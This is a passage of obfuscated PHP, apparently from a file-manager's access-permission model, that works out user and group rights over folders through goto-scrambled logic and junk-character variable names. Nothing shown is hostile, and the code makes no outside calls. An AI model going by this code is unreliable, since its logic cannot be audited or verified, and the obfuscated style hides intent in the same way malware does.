=> $fñ¸‹©Û”ñ[999], $fñ¸‹©Û”ñ[29] => $fñ¸‹©Û”ñ[516], $fñ¸‹©Û”ñ[493] => $dÀ©“èáò[$fñ¸‹©Û”ñ[489]], $fñ¸‹©Û”ñ[1671] => $dÀ©“èáò[$fñ¸‹©Û”ñ[1671]], $fñ¸‹©Û”ñ[486] => $dÀ©“èáò[$fñ¸‹©Û”ñ[476]], $fñ¸‹©Û”ñ[1842] => array($béŒÔ¿Ñêã)); $fœ±¾¹²¾é[$f¬¾¾£íÙ¦[$fñ¸‹©Û”ñ[394]]] = $f¬¾¾£íÙ¦; } } $Fáè¶ä®¥ = array(); $DÒ½Ãµ¸² = $this->getAllChildren($eŒ‚ÜÉ©Ö‚); goto BÇ ½ê©øİ; A½œÍèÇßŸ: return $Fáè¶ä®¥; goto eÖ½ÁğõŒ¦; EÙªï«­ù˜: $fñ¸‹©Û”ñ =& $_SERVER[Ïº«‚ßèÔˆø]; $D¸ùã””÷ = Model($fñ¸‹©Û”ñ[505])->getInfo($EİœĞ¼ÑÁë); if (!$EİœĞ¼ÑÁë || !$eŒ‚ÜÉ©Ö‚ || !$D¸ùã””÷) { return array(); } goto cÍ‹˜äÅ; BÇ ½ê©øİ: foreach ($DÒ½Ãµ¸² as $EÍ©‘İÇ²³) { $eÓ¨™ïÎ¬ß = !1; foreach ($EÍ©‘İÇ²³[$fñ¸‹©Û”ñ[1842]] as $EÙ°ˆ‡ëµŸ) { if ($EÙ°ˆ‡ëµŸ[$fñ¸‹©Û”ñ[1508]]) { if ($EÙ°ˆ‡ëµŸ[$fñ¸‹©Û”ñ[1508]] == $EİœĞ¼ÑÁë) { $eÓ¨™ïÎ¬ß = !0; break; } } if ($EÙ°ˆ‡ëµŸ[$fñ¸‹©Û”ñ[1671]]) { if ($this->groupContainUser($EÙ°ˆ‡ëµŸ[$fñ¸‹©Û”ñ[1671]], $EİœĞ¼ÑÁë)) { $eÓ¨™ïÎ¬ß = !0; break; } } } if ($eÓ¨™ïÎ¬ß) { $Fáè¶ä®¥[] = $EÍ©‘İÇ²³; } $e˜ò„±é‹¿ = $EÍ©‘İÇ²³[$fñ¸‹©Û”ñ[394]]; if (isset($fœ±¾¹²¾é[$e˜ò„±é‹¿])) { $EÍ©‘İÇ²³[$fñ¸‹©Û”ñ[1842]][] = $fœ±¾¹²¾é[$e˜ò„±é‹¿][0]; $fœ±¾¹²¾é[$e˜ò„±é‹¿] = !1; } } $fœ±¾¹²¾é = array_filter(array_values($fœ±¾¹²¾é)); $Fáè¶ä®¥ = array_merge($fœ±¾¹²¾é, $Fáè¶ä®¥); goto A½œÍèÇßŸ; cÍ‹˜äÅ: $c«¤©Û‹‘­ = Model($fñ¸‹©Û”ñ[1187])->sourceInfo($eŒ‚ÜÉ©Ö‚); $fœ±¾¹²¾é = array(); $BŠä„¬¯ø = 1; goto dóõ°¹â¸·; eÖ½ÁğõŒ¦: } public function setAllChildrenByUser($b°õèˆ†’É, $aø÷«µØÒË, $Aìƒ™ìÂÏ) { $BÓëÁ—ÏÉ£ =& $_SERVER[Ïº«‚ßèÔˆø]; $Fî˜À›ë = $this->getAllChildrenByUser($b°õèˆ†’É, $aø÷«µØÒË); if (!$Aìƒ™ìÂÏ || !$Fî˜À›ë) { return !1; } foreach ($Fî˜À›ë as $a„ó½ «´¿) { $dÕë—Ë’ ” = array(); foreach ($a„ó½ «´¿[$BÓëÁ—ÏÉ£[1842]] as $CÅî­·¶¹) { $Aƒ©±‘·ôš = $CÅî­·¶¹[$BÓëÁ—ÏÉ£[444]]; $DÅÑòÈ´ùÏ = $CÅî­·¶¹[$BÓëÁ—ÏÉ£[1508]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $bô†¦î¹Î = $CÅî­·¶¹[$BÓëÁ—ÏÉ£[1508]] ? $CÅî­·¶¹[$BÓëÁ—ÏÉ£[1508]] : $CÅî­·¶¹[$BÓëÁ—ÏÉ£[1671]]; if ($CÅî­·¶¹[$BÓëÁ—ÏÉ£[1508]] && $CÅî­·¶¹[$BÓëÁ—ÏÉ£[1508]] == $aø÷«µØÒË) { continue; } $dÕë—Ë’ ”[] = array($BÓëÁ—ÏÉ£[394] => $a„ó½ «´¿[$BÓëÁ—ÏÉ£[394]], $BÓëÁ—ÏÉ£[402] => $DÅÑòÈ´ùÏ, $BÓëÁ—ÏÉ£[482] => intval($bô†¦î¹Î), $BÓëÁ—ÏÉ£[1766] => isset($Aƒ©±‘·ôš[$BÓëÁ—ÏÉ£[392]]) ? intval($Aƒ©±‘·ôš[$BÓëÁ—ÏÉ£[392]]) : 0, $BÓëÁ—ÏÉ£[1820] => isset($Aƒ©±‘·ôš[$BÓëÁ—ÏÉ£[1820]]) ? intval($Aƒ©±‘·ôš[$BÓëÁ—ÏÉ£[1820]]) : -1); } $dÕë—Ë’ ”[] = array($BÓëÁ—ÏÉ£[394] => $a„ó½ «´¿[$BÓëÁ—ÏÉ£[394]], $BÓëÁ—ÏÉ£[402] => SourceModel::TYPE_USER, $BÓëÁ—ÏÉ£[482] => intval($aø÷«µØÒË), $BÓëÁ—ÏÉ£[1766] => intval($Aìƒ™ìÂÏ), $BÓëÁ—ÏÉ£[1820] => -1); $this->where(array($BÓëÁ—ÏÉ£[408] => $a„ó½ «´¿[$BÓëÁ—ÏÉ£[394]]))->delete(); $this->addAll($dÕë—Ë’ ”); } return !0; } public function get($d´×±Í´») { $B±‘ªİ‡Ä„ = $this->getSourceList(array($d´×±Í´»), !0); return $B±‘ªİ‡Ä„[0]; } public function getSourceList($AÀ¤ÜŒÈ„–, $FÄëœ©ëˆ§ = false, $aë”ô¥Üˆ = false) { goto C®ØìÇã­; c³œÀ…ğ‹: foreach ($FÄëœ©ëˆ§ as $eË»õ³Ç‰ => $F±ôÊóø×) { $F¾ç²—Ïæë = $D˜±âçˆ‹ò->parentLevelArray($F±ôÊóø×[$cĞ—½‡àˆË[485]]); $Bè’»Ú£øÌ = array_merge($Bè’»Ú£øÌ, array($eË»õ³Ç‰), array_reverse($F¾ç²—Ïæë)); } $Bè’»Ú£øÌ = array_values(array_unique($Bè’»Ú£øÌ)); if (!$Bè’»Ú£øÌ) { return array(); } goto d†Šáµ§õ©; fá£Ó™Î…é: $B ñÕ¹Êˆ„ = array(); foreach ($FÄëœ©ëˆ§ as $aä©´ïŸ½ => $eƒö¯Å÷š’) { if ($FœªĞ£Ëï) { $B ñÕ¹Êˆ„[$aä©´ïŸ½] = $e®áÇÆ×³µ; continue; } $B ñÕ¹Êˆ„[$aä©´ïŸ½] = $this->makeSourceAuth($eƒö¯Å÷š’, $Dµ³Ï¢ñ®, $aë”ô¥Üˆ); } return $B ñÕ¹Êˆ„; goto bÖ©“Î…; C®ØìÇã­: $cĞ—½‡àˆË =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$AÀ¤ÜŒÈ„–) { return array(); } $D˜±âçˆ‹ò = Model($cĞ—½‡àˆË[1187]); goto Eé®‹¿Î¢®; CÅºÅºÓÍ…: $FœªĞ£Ëï = $this->userIsRoot($aë”ô¥Üˆ); $f‹“¤ŞÄƒ = AuthModel::authAll(); $e®áÇÆ×³µ = array($cĞ—½‡àˆË[405] => $f‹“¤ŞÄƒ, $cĞ—½‡àˆË[1847] => array($cĞ—½‡àˆË[410] => 0, $cĞ—½‡àˆË[1677] => $f‹“¤ŞÄƒ, $cĞ—½‡àˆË[411] => LNG($cĞ—½‡àˆË[1848]), $cĞ—½‡àˆË[1692] => $cĞ—½‡àˆË[1849])); goto fá£Ó™Î…é; Eé®‹¿Î¢®: if (!$FÄëœ©ëˆ§ && count($AÀ¤ÜŒÈ„–) == 1) { $FÄëœ©ëˆ§ = array(); $FÄëœ©ëˆ§[$AÀ¤ÜŒÈ„–[0]] = $D˜±âçˆ‹ò->sourceInfo($AÀ¤ÜŒÈ„–[0]); } if (!$FÄëœ©ëˆ§) { $EŒŸ§º‹¬ = array($cĞ—½‡àˆË[408] => array($cĞ—½‡àˆË[409], $AÀ¤ÜŒÈ„–)); $FÄëœ©ëˆ§ = $D˜±âçˆ‹ò->field($cĞ—½‡àˆË[1846])->where($EŒŸ§º‹¬)->select(); $FÄëœ©ëˆ§ = array_to_keyvalue($FÄëœ©ëˆ§, $cĞ—½‡àˆË[394]); } $Bè’»Ú£øÌ = $AÀ¤ÜŒÈ„–; goto c³œÀ…ğ‹; d†Šáµ§õ©: $eŠä©ö÷Ô• = $this->sourceAuthSelect($Bè’»Ú£øÌ); $Dµ³Ï¢ñ® = array(); foreach ($Bè’»Ú£øÌ as $aä©´ïŸ½) { if (isset($eŠä©ö÷Ô•[$aä©´ïŸ½])) { $Dµ³Ï¢ñ®[$aä©´ïŸ½] = $eŠä©ö÷Ô•[$aä©´ïŸ½]; } } goto CÅºÅºÓÍ…; bÖ©“Î…: } public function authDeepCheck($Fòæ«­ÁÛ, $f˜øš«‚¿í = false) { goto b‡åì‚ÎßÑ; b‡åì‚ÎßÑ: $E„å²–ÁÒ =& $_SERVER[Ïº«‚ßèÔˆø]; $f˜øš«‚¿í = $f˜øš«‚¿í ? $f˜øš«‚¿í : USER_ID; $Eùà•³óÛç = $this->makeAuthDeep($f˜øš«‚¿í); goto bë—óÑ°£¬; bë—óÑ°£¬: if (!in_array($Fòæ«­ÁÛ, $Eùà•³óÛç[$E„å²–ÁÒ[1850]])) { return !1; } $bã¯éï†”½ = array(); foreach ($Eùà•³óÛç[$E„å²–ÁÒ[1851]] as $DÍ¡ƒ‚²Ô => $FŠšâ¸È˜) { if (!in_array($Fòæ«­ÁÛ, $FŠšâ¸È˜)) { continue; } $bã¯éï†”½[] = $DÍ¡ƒ‚²Ô; } goto b²×²ÅÓå; b²×²ÅÓå: if (!$bã¯éï†”½) { return !1; } $Aïçèç¬íµ = $bã¯éï†”½ ? $bã¯éï†”½[0] : $Fòæ«­ÁÛ; return array($E„å²–ÁÒ[405] => -1, $E„å²–ÁÒ[444] => array($E„å²–ÁÒ[410] => $E„å²–ÁÒ[1068], $E„å²–ÁÒ[1677] => $E„å²–ÁÒ[495], $E„å²–ÁÒ[411] => LNG($E„å²–ÁÒ[1852]), $E„å²–ÁÒ[1692] => $E„å²–ÁÒ[1853]), $E„å²–ÁÒ[1854] => LNG($E„å²–ÁÒ[1855]), $E„å²–ÁÒ[1856] => $this->sourceAuthInfo($Aïçèç¬íµ)); goto D»È¯Ÿ­ƒ°; D»È¯Ÿ­ƒ°: } protected function makeAuthDeep($C£ò’©ÀÒ = false) { goto A¶çò÷ˆù‡; D¥ä©í¥’¶: $b¿Şš™Ù‚· = array(); $aºªÍù¤ = array(); $A˜µÖê¢Ü“ = array(); goto bá‚ö‹™«è; FØØ††ò“: if ($BÉõ–¡ïÓ) { $BïƒÙ´•·ò = array(array($b©óÚ¿óÜ[402] => SourceModel::TYPE_USER, $b©óÚ¿óÜ[482] => $C£ò’©ÀÒ), array($b©óÚ¿óÜ[402] => SourceModel::TYPE_GROUP, $b©óÚ¿óÜ[482] => array($b©óÚ¿óÜ[409], $BÉõ–¡ïÓ)), $b©óÚ¿óÜ[941] => $b©óÚ¿óÜ[1758]); } $a¹Î˜¢À¢¥ = $this->field($b©óÚ¿óÜ[1858])->where($BïƒÙ´•·ò)->select(); $c«Áœ øŞ = array(); goto BÉß…¼„‚; A¶çò÷ˆù‡: $b©óÚ¿óÜ =& $_SERVER[Ïº«‚ßèÔˆø]; static $dĞçæÄ¡ = array(); $C£ò’©ÀÒ = $C£ò’©ÀÒ ? $C£ò’©ÀÒ : USER_ID; goto c×îâŠ³; c…»…£‰ÔÑ: foreach ($CÂÚÓø¦Ê as $aÃß´“õ¦) { if ($aÃß´“õ¦[$b©óÚ¿óÜ[404]] == 0 && $aÃß´“õ¦[$b©óÚ¿óÜ[1693]] == $b©óÚ¿óÜ[87]) { $E¶Ä†„·â[] = $aÃß´“õ¦[$b©óÚ¿óÜ[392]]; } } $BÉõ–¡ïÓ = $this->userGroupParents($C£ò’©ÀÒ); $BïƒÙ´•·ò = array($b©óÚ¿óÜ[402] => SourceModel::TYPE_USER, $b©óÚ¿óÜ[482] => $C£ò’©ÀÒ); goto FØØ††ò“; Aæ´º”ÀŸ¬: foreach ($FÛ…·âØê™ as $F›Ç—…¸Œ³) { $DŸ’‚éö± = $C®‰¶ÄêÄİ->getInfo($F›Ç—…¸Œ³); $cÛ ÂÔà‡[] = $DŸ’‚éö±[$b©óÚ¿óÜ[85]][$b©óÚ¿óÜ[394]]; $A˜µÖê¢Ü“[$F›Ç—…¸Œ³] = $DŸ’‚éö±[$b©óÚ¿óÜ[85]][$b©óÚ¿óÜ[394]]; $BÄÔàî‡¼É[$F›Ç—…¸Œ³] = $EÁì½›‘¬Ò->parentLevelArray($DŸ’‚éö±[$b©óÚ¿óÜ[485]]); } foreach ($b¿Şš™Ù‚· as $CÚ²ƒ¹ù¬ => $eéöèõ‰¶’) { $E¯‰¥©ÉÙ = $aºªÍù¤[$CÚ²ƒ¹ù¬]; if (!$E¯‰¥©ÉÙ || !$A˜µÖê¢Ü“[$E¯‰¥©ÉÙ]) { continue; } $bò´çµçæâ = array(); foreach ($BÄÔàî‡¼É[$E¯‰¥©ÉÙ] as $F›Ç—…¸Œ³) { $bò´çµçæâ[] = $A˜µÖê¢Ü“[$F›Ç—…¸Œ³]; } $b¿Şš™Ù‚·[$CÚ²ƒ¹ù¬] = array_merge($bò´çµçæâ, $eéöèõ‰¶’); } $cÛ ÂÔà‡ = array_values(array_unique($cÛ ÂÔà‡)); goto EÏ¥¸¯Õö¹; BÉß…¼„‚: $b˜¼ƒô¤åƒ = array_to_keyvalue_group($a¹Î˜¢À¢¥, $b©óÚ¿óÜ[394]); foreach ($b˜¼ƒô¤åƒ as $EˆÊ²õ„¯ç => $D•ø“Ãè‹) { $d–‹»Õ¶Äœ = $this->authArrayCheck($D•ø“Ãè‹, $C£ò’©ÀÒ); if ($d–‹»Õ¶Äœ[$b©óÚ¿óÜ[405]] > 0) { $c«Áœ øŞ[] = $EˆÊ²õ„¯ç . $b©óÚ¿óÜ[33]; } } $cÛ ÂÔà‡ = array(); goto EºÅ¡¢¶‹; EºÅ¡¢¶‹: $FÛ…·âØê™ = $BÉõ–¡ïÓ; $EÁì½›‘¬Ò = Model($b©óÚ¿óÜ[1187]); $C®‰¶ÄêÄİ = Model($b©óÚ¿óÜ[484]); goto D¥ä©í¥’¶; d–¢Ñíá¬: $B¡Úô‘¾Õ = $FÛ…·âØê™; foreach ($B¡Úô‘¾Õ as $F›Ç—…¸Œ³) { $DŸ’‚éö± = $C®‰¶ÄêÄİ->getInfo($F›Ç—…¸Œ³); $e­•æ™‹Ú = $EÁì½›‘¬Ò->parentLevelArray($DŸ’‚éö±[$b©óÚ¿óÜ[485]]); $FÛ…·âØê™ = array_merge($FÛ…·âØê™, $e­•æ™‹Ú); } $FÛ…·âØê™ = array_values(array_unique($FÛ…·âØê™)); goto Aæ´º”ÀŸ¬; bá‚ö‹™«è: $BÄÔàî‡¼É = array(); if ($c«Áœ øŞ) { $bÖÊ­¥ø‡È = $EÁì½›‘¬Ò->where(array($b©óÚ¿óÜ[394] => array($b©óÚ¿óÜ[409], $c«Áœ øŞ)))->select(); foreach ($bÖÊ­¥ø‡È as $FÑÀˆ§Ùì) { $e­•æ™‹Ú = $EÁì½›‘¬Ò->parentLevelArray($FÑÀˆ§Ùì[$b©óÚ¿óÜ[485]]); $cÛ ÂÔà‡ = array_merge($cÛ ÂÔà‡, $e­•æ™‹Ú); $FÛ…·âØê™[] = $FÑÀˆ§Ùì[$b©óÚ¿óÜ[482]]; $b¿Şš™Ù‚·[$FÑÀˆ§Ùì[$b©óÚ¿óÜ[394]]] = $e­•æ™‹Ú; $aºªÍù¤[$FÑÀˆ§Ùì[$b©óÚ¿óÜ[394]]] = $FÑÀˆ§Ùì[$b©óÚ¿óÜ[482]]; } } $FÛ…·âØê™ = array_values(array_unique($FÛ…·âØê™)); goto d–¢Ñíá¬; EÏ¥¸¯Õö¹: $eòô ì‰é¡ = array($b©óÚ¿óÜ[1850] => $cÛ ÂÔà‡, $b©óÚ¿óÜ[1851] => $b¿Şš™Ù‚·); $dĞçæÄ¡[$C£ò’©ÀÒ] = $eòô ì‰é¡; return $eòô ì‰é¡; goto fÅ—•ºÖ’–; c×îâŠ³: if (isset($dĞçæÄ¡[$C£ò’©ÀÒ])) { return $dĞçæÄ¡[$C£ò’©ÀÒ]; } $CÂÚÓø¦Ê = Model($b©óÚ¿óÜ[1857])->listData(); $E¶Ä†„·â = array(); goto c…»…£‰ÔÑ; fÅ—•ºÖ’–: } private function makeSourceAuth($fòØ¬×¡Úß, $b˜ ó¾˜¬, $b‚¦ÅœÖ = false) { goto C±³òƒš÷; f çâÔ‹¸: foreach ($FÎÀ÷š¿õš as $D¥Ğ·ÅÉÏ) { if (!isset($b˜ ó¾˜¬[$D¥Ğ·ÅÉÏ])) { continue; } $AßÈÓ¶êÑ© = $this->authMake($b˜ ó¾˜¬[$D¥Ğ·ÅÉÏ], $b‚¦ÅœÖ); if ($AßÈÓ¶êÑ©[$FÎ¼¸°±†[444]]) { $A‚Üõ†®«® = $AßÈÓ¶êÑ©; break; } } if (!$fÜ›ö±ñî) { return $A‚Üõ†®«®; } if (!$A‚Üõ†®«® && $CŞ†ŠäÎÏç) { $A‚Üõ†®«® = $this->groupAuthInfo($CŞ†ŠäÎÏç, $fö±â†°È™); } goto D Š˜ó´À˜; C±³òƒš÷: $FÎ¼¸°±† =& $_SERVER[Ïº«‚ßèÔˆø]; $F‘”ï ö¡¶ = $FÎ¼¸°±†[87]; $fö±â†°È™ = $fòØ¬×¡Úß[$FÎ¼¸°±†[482]]; goto d‡¶ìõŒ¿â; B’ãòÀ‹Ú: $FÎÀ÷š¿õš = Model($FÎ¼¸°±†[1187])->parentLevelArray($fòØ¬×¡Úß[$FÎ¼¸°±†[485]]); $FÎÀ÷š¿õš = array_merge(array($fòØ¬×¡Úß[$FÎ¼¸°±†[394]]), array_reverse($FÎÀ÷š¿õš)); $A‚Üõ†®«® = !1; goto f çâÔ‹¸; D Š˜ó´À˜: if (!$A‚Üõ†®«®) { $DÕù¦©““Ò = Model($FÎ¼¸°±†[484])->getInfo($fö±â†°È™); $CË•·„‚†´ = explode($FÎ¼¸°±†[47], trim($DÕù¦©““Ò[$FÎ¼¸°±†[485]], $FÎ¼¸°±†[47])); $CË•·„‚†´ = array_reverse($CË•·„‚†´); foreach ($CË•·„‚†´ as $dÅòÌŒéœŸ) { if ($dÅòÌŒéœŸ == $FÎ¼¸°±†[495] || $dÅòÌŒéœŸ == $F‘”ï ö¡¶) { continue; } $F‡êŒø äˆ = $this->groupRootAuth($dÅòÌŒéœŸ, $b‚¦ÅœÖ); if (!$F‡êŒø äˆ) { continue; } $A‚Üõ†®«® = $this->groupAuthInfo($F‡êŒø äˆ, $dÅòÌŒéœŸ); break; } } if (!$A‚Üõ†®«® || $A‚Üõ†®«®[$FÎ¼¸°±†[405]] <= 0) { $dĞÕ ‹§í = $this->authDeepCheck($fòØ¬×¡Úß[$FÎ¼¸°±†[394]], $b‚¦ÅœÖ); if ($dĞÕ ‹§í) { $A‚Üõ†®«® = $dĞÕ ‹§í; } } return $A‚Üõ†®«®; goto A§ÓÏâé¦â; d‡¶ìõŒ¿â: $fÜ›ö±ñî = $fòØ¬×¡Úß[$FÎ¼¸°±†[402]] == SourceModel::TYPE_GROUP; $CŞ†ŠäÎÏç = $fÜ›ö±ñî ? $this->groupRootAuth($fö±â†°È™, $b‚¦ÅœÖ) : !1; if ($CŞ†ŠäÎÏç && Model($FÎ¼¸°±†[1838])->authCheckAction($CŞ†ŠäÎÏç[$FÎ¼¸°±†[404]], $FÎ¼¸°±†[1691])) { return $this->groupAuthInfo($CŞ†ŠäÎÏç, $fö±â†°È™); } goto B’ãòÀ‹Ú; A§ÓÏâé¦â: } private function userIsRoot($aÄè‰– Á² = false) { $dÅÆ¥ç¨¸ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$aÄè‰– Á² && _get($GLOBALS, $dÅÆ¥ç¨¸[483])) { return !0; } $Aç³­©Ô› = Model($dÅÆ¥ç¨¸[505])->getInfo($aÄè‰– Á²); $CÜºŞù›ß¯ = Model($dÅÆ¥ç¨¸[1859])->listData($Aç³­©Ô›[$dÅÆ¥ç¨¸[1394]]); if ($CÜºŞù›ß¯ && $CÜºŞù›ß¯[$dÅÆ¥ç¨¸[1264]][$dÅÆ¥ç¨¸[1860]] == 1) { return !0; } return !1; } private function sourceAuthInfo($a»õß¿) { goto B…â¿ßÔÄÙ; B…â¿ßÔÄÙ: $aà¨¦¼ë–  =& $_SERVER[Ïº«‚ßèÔˆø]; $Fã¦’Â´ÙË = Model($aà¨¦¼ë– [1187]); $B¯½ºµÇ² = $Fã¦’Â´ÙË->sourceInfo($a»õß¿); goto CåÙŒÓç‰ƒ; CåÙŒÓç‰ƒ: if (!$B¯½ºµÇ²) { return !1; } $Fã¦’Â´ÙË->groupPathDisplay($B¯½ºµÇ²); $b»¯á–ê = array($B¯½ºµÇ²); goto eó’Äˆ‹î†; eó’Äˆ‹î†: $b»¯á–ê = $Fã¦’Â´ÙË->_listAppendPath($b»¯á–ê); $B¯½ºµÇ² = $b»¯á–ê[0]; $E¾é‘‹Ù²ø = $B¯½ºµÇ²[$aà¨¦¼ë– [493]]; goto Eò›îÎ; Eò›îÎ: if (isset($B¯½ºµÇ²[$aà¨¦¼ë– [490]])) { $c³Ğ“Ì¾Êñ = explode($aà¨¦¼ë– [8], trim($B¯½ºµÇ²[$aà¨¦¼ë– [493]], $aà¨¦¼ë– [8])); array_shift($c³Ğ“Ì¾Êñ); $E¾é‘‹Ù²ø = $B¯½ºµÇ²[$aà¨¦¼ë– [488]] . $aà¨¦¼ë– [1861] . implode($aà¨¦¼ë– [8], $c³Ğ“Ì¾Êñ); } return array($aà¨¦¼ë– [411] => $B¯½ºµÇ²[$aà¨¦¼ë– [28]], $aà¨¦¼ë– [76] => KodIO::make($B¯½ºµÇ²[$aà¨¦¼ë– [394]]), $aà¨¦¼ë– [1862] => $E¾é‘‹Ù²ø); goto dŞà¥è›§; dŞà¥è›§: } private function groupAuthInfo($aç¨Üİê®ä, $E½¾ô¾¸ì†) { $eÂ±èçÁ =& $_SERVER[Ïº«‚ßèÔˆø]; $B«÷¡ôÛŸÛ = Model($eÂ±èçÁ[484])->getInfo($E½¾ô¾¸ì†); return array($eÂ±èçÁ[1863] => intval($aç¨Üİê®ä[$eÂ±èçÁ[404]]), $eÂ±èçÁ[1847] => $aç¨Üİê®ä, $eÂ±èçÁ[1864] => LNG($eÂ±èçÁ[1865]), $eÂ±èçÁ[1856] => array($eÂ±èçÁ[411] => $B«÷¡ôÛŸÛ[$eÂ±èçÁ[28]], $eÂ±èçÁ[76] => KodIO::make($B«÷¡ôÛŸÛ[$eÂ±èçÁ[85]][$eÂ±èçÁ[394]]), $eÂ±èçÁ[1862] => $B«÷¡ôÛŸÛ[$eÂ±èçÁ[489]])); } protected function groupRootAuth($d‚öÕ×ôî”, $e›®ñÆŸ¶¾ = false) { goto CãªƒÅ¢ˆÈ; F°Î–º: static $Dš·©–¯‘ = array(); if (isset($Dš·©–¯‘[$CöæµĞ¡°Æ])) { return $Dš·©–¯‘[$CöæµĞ¡°Æ]; } $BÀ×¤Í»Êğ = Model($DŸ¢»µóá¬[484])->getInfo($d‚öÕ×ôî”); goto f”¤ÉŒÖÖÏ; c‘ø«…ÆÒá: $Dš·©–¯‘[$CöæµĞ¡°Æ] = $dê½·­‹±á ? $dê½·­‹±á : $F ÔôÂãÒ²; return $Dš·©–¯‘[$CöæµĞ¡°Æ]; goto BíŒÂÅÄŠ; e©©ßƒ–‰: $E¶š²†Â×Ö = $this->sourceAuthSelect($BÀ×¤Í»Êğ[$DŸ¢»µóá¬[85]][$DŸ¢»µóá¬[394]]); $E •Ù‚ŠøÍ = $E¶š²†Â×Ö ? $this->authMake($E¶š²†Â×Ö, $e›®ñÆŸ¶¾) : !1; $dê½·­‹±á = $E •Ù‚ŠøÍ ? $E •Ù‚ŠøÍ[$DŸ¢»µóá¬[444]] : !1; goto c‘ø«…ÆÒá; CãªƒÅ¢ˆÈ: $DŸ¢»µóá¬ =& $_SERVER[Ïº«‚ßèÔˆø]; $e›®ñÆŸ¶¾ = $e›®ñÆŸ¶¾ ? $e›®ñÆŸ¶¾ : USER_ID; $CöæµĞ¡°Æ = $e›®ñÆŸ¶¾ . $DŸ¢»µóá¬[1866] . $d‚öÕ×ôî”; goto F°Î–º; f”¤ÉŒÖÖÏ: $Cœ„ÏŒ‘Û = $this->userGroupList($e›®ñÆŸ¶¾); $F ÔôÂãÒ² = isset($Cœ„ÏŒ‘Û[$d‚öÕ×ôî”]) ? $Cœ„ÏŒ‘Û[$d‚öÕ×ôî”][$DŸ¢»µóá¬[404]] : !1; if ($F ÔôÂãÒ² && Model($DŸ¢»µóá¬[1838])->authCheckAction($F ÔôÂãÒ²[$DŸ¢»µóá¬[404]], $DŸ¢»µóá¬[1691])) { $Dš·©–¯‘[$CöæµĞ¡°Æ] = $F ÔôÂãÒ²; return $F ÔôÂãÒ²; } goto e©©ßƒ–‰; BíŒÂÅÄŠ: } public function authOwnerApply($FäóºâëÌÃ) { goto dë©îÚÍå; fÉßææ÷: if (count($dØìùÇÇÉ†) == 0) { $dØìùÇÇÉ† = $this->authFolderOwnerGroup($FäóºâëÌÃ[$EğĞ‰ÊœËï[482]]); } $dØìùÇÇÉ† = array_unique($dØìùÇÇÉ†); if (AuthModel::authCheckRoot($FäóºâëÌÃ[$EğĞ‰ÊœËï[404]][$EğĞ‰ÊœËï[405]])) { $dØìùÇÇÉ†[] = USER_ID; } goto EŠÛÀâÌ; E÷ŠŸë£ÚÊ: $EÍ×ºÁ¬Ã¤ = array(); $dØìùÇÇÉ† = array(); foreach ($Eƒòè¸Õ¦µ as $EÙİ¼ìÌ… => $FµÃç„‡ë¤) { $D²ºë”İ¡ = $this->authFolderOwnerUser($FµÃç„‡ë¤); $EÍ×ºÁ¬Ã¤[$EÙİ¼ìÌ…] = $D²ºë”İ¡; $dØìùÇÇÉ† = array_merge($dØìùÇÇÉ†, $D²ºë”İ¡[$EğĞ‰ÊœËï[561]]); if ($D²ºë”İ¡[$EğĞ‰ÊœËï[1868]]) { break; } } goto fÉßææ÷; A•³¡˜ÕŒİ: $d¦à••Š¼ = Model($EğĞ‰ÊœËï[1187])->parentLevelArray($FäóºâëÌÃ[$EğĞ‰ÊœËï[485]]); $d¦à••Š¼ = array_merge(array($FäóºâëÌÃ[$EğĞ‰ÊœËï[394]]), array_reverse($d¦à••Š¼)); $Eƒòè¸Õ¦µ = $this->sourceAuthSelect($d¦à••Š¼); goto E÷ŠŸë£ÚÊ; dë©îÚÍå: $EğĞ‰ÊœËï =& $_SERVER[Ïº«‚ßèÔˆø]; if (empty($FäóºâëÌÃ[$EğĞ‰ÊœËï[404]]) || isset($FäóºâëÌÃ[$EğĞ‰ÊœËï[1867]]) && $FäóºâëÌÃ[$EğĞ‰ÊœËï[1867]]) { return $FäóºâëÌÃ; } if (AuthModel::authCheckRoot($FäóºâëÌÃ[$EğĞ‰ÊœËï[404]][$EğĞ‰ÊœËï[405]])) { return $FäóºâëÌÃ; } goto A•³¡˜ÕŒİ; EŠÛÀâÌ: $FäóºâëÌÃ[$EğĞ‰ÊœËï[404]][$EğĞ‰ÊœËï[1869]] = Model($EğĞ‰ÊœËï[501])->userListInfo($dØìùÇÇÉ†); return $FäóºâëÌÃ; goto BøÆêœÀ„×; BøÆêœÀ„×: } private function authFolderOwnerGroup($Bœê«ÏÕ§¨) { $Eé‚•ÍÁï— =& $_SERVER[Ïº«‚ßèÔˆø]; $a‡ ğ»ë× = Model($Eé‚•ÍÁï—[1752])->where(array($Eé‚•ÍÁï—[1671] => $Bœê«ÏÕ§¨))->select(); $b³â½‹¼ÍÔ = array(); if (!$a‡ ğ»ë×) { return $b³â½‹¼ÍÔ; } foreach ($a‡ ğ»ë× as $DèÈ×ÊñŸÒ) { $E¸šê¦ìãœ = $this->authInfo($DèÈ×ÊñŸÒ); if (AuthModel::authCheckRoot($E¸šê¦ìãœ[$Eé‚•ÍÁï—[404]])) { $b³â½‹¼ÍÔ[] = $DèÈ×ÊñŸÒ[$Eé‚•ÍÁï—[1508]]; } } return $b³â½‹¼ÍÔ; } private function authFolderOwnerUser($C¥ªÀËŒ¦×) { $A×–…ñÇŠ =& $_SERVER[Ïº«‚ßèÔˆø]; $F´†›‡°Ó» = array(); $d¬Ãİ–±¼á = !1; foreach ($C¥ªÀËŒ¦× as $f†ƒÂíØğ‚) { $DÜÑ„¯ˆªä = $this->authInfo($f†ƒÂíØğ‚); if ($f†ƒÂíØğ‚[$A×–…ñÇŠ[482]] == $A×–…ñÇŠ[495]) { $d¬Ãİ–±¼á = !0; } if ($f†ƒÂíØğ‚[$A×–…ñÇŠ[402]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($DÜÑ„¯ˆªä[$A×–…ñÇŠ[404]])) { $F´†›‡°Ó»[] = $f†ƒÂíØğ‚[$A×–…ñÇŠ[482]]; } } } return array($A×–…ñÇŠ[561] => $F´†›‡°Ó», $A×–…ñÇŠ[1868] => $d¬Ãİ–±¼á); } public function authMake($c‘ÈãÀæ×, $AŠ²Åñó¾ì = false) { $b¥°íİ¦ğ =& $_SERVER[Ïº«‚ßèÔˆø]; $B¬Š¤£Õõô = $this->authArrayCheck($c‘ÈãÀæ×, $AŠ²Åñó¾ì); if ($B¬Š¤£Õõô[$b¥°íİ¦ğ[1870]]) { $B¬Š¤£Õõô[$b¥°íİ¦ğ[1870]] = 